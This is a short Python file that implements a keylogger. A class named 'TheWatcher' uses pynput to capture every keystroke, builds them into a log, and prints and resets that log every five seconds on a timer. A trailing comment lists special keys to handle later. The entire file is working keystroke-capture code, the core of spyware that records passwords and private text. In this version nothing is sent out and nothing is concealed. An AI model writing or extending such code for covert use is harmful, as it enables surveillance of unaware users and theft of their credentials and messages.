import pynput.keyboard as keyboard
import threading

class TheWatcher:
 def __init__(self):
  self.log = ""

 def log_appender(self,string):
  self.log = self.log + string

 def callingBack(self, key):
  try:
   current_key = str(key.char)
  except AttributeError:
   if key == key.space:
    current_key = " "
   else:
    current_key = " " + str(key) + " "
  self.log_appender(current_key)

 def report(self):
  print(self.log)
  self.log = ""
  start_Timer = threading.Timer(5, self.report)
  start_Timer.start()

 def startWatcher(self):
  key_Listener = keyboard.Listener(on_press=self.callingBack)
  with key_Listener:
   self.report()
   key_Listener.join()

#Later to implement
#Key.backspace  Key.space  Key.enter  Key.up  Key.down  Key.left  Key.right  Key.ctrl  Key.cmd  Key.alt NoneNone Key.shift  Key.caps_lock  Key.caps_lock  Key.tab  Key.ctrl 
